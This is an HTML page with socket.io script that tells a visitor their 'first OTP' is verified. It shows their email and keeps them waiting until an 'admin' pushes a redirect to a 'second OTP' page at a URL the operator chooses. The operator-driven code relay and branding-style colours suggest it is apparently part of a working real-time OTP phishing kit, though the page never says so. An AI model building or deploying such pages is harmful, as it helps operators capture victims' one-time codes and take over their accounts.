<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success - OTP Verified</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0a;
            padding: 16px;
        }
        .success-container {
            text-align: center;
            background: #121212;
            padding: 40px 32px;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
            border: 1px solid #2a2a2a;
            color: white;
            max-width: 380px;
            width: 100%;
        }
        .checkmark {
            font-size: 70px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 10px;
        }
        p {
            color: #aaa;
            margin-bottom: 20px;
        }
        .email {
            color: #fe2c55;
            font-weight: 500;
            margin: 10px 0;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 40px;
            word-break: break-all;
        }
        .waiting-message {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 40px;
            margin-top: 20px;
            border: 1px solid #2a2a2a;
        }
        .waiting-message .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fe2c55;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2196F3;
            color: white;
            padding: 15px 20px;
            border-radius: 40px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            display: none;
            animation: slideIn 0.3s ease;
            z-index: 1000;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="success-container">
        <div class="checkmark">✓</div>
        <h2>OTP Verified Successfully!</h2>
        <p>Your first OTP has been verified.</p>
        <div class="email" id="emailDisplay"></div>
        
        <div class="waiting-message">
            <span class="spinner"></span>
            <span>Waiting for admin to request second OTP...</span>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Get email from URL
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        if (email) {
            document.getElementById('emailDisplay').textContent = email;
        } else {
            document.getElementById('emailDisplay').textContent = 'No email provided';
        }

        // Connect to socket.io
        const socket = io();

        // Show toast notification
        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }

        // Listen for redirect event from admin
        socket.on('redirect-to-second-otp', (data) => {
            console.log('📢 Received redirect request:', data);
            
            if (data.email === email) {
                showToast('📱 Admin requested second OTP! Redirecting...');
                
                // Redirect to otp.html with type=second parameter
                setTimeout(() => {
                    window.location.href = data.redirectUrl;
                }, 1500);
            }
        });

        // Listen for test notifications
        socket.on('test-notification', (data) => {
            console.log('Test:', data);
        });

        // Optional: Add a manual refresh button or keep-alive
        console.log('✅ Success page loaded, waiting for admin to request second OTP...');
    </script>
</body>
</html>
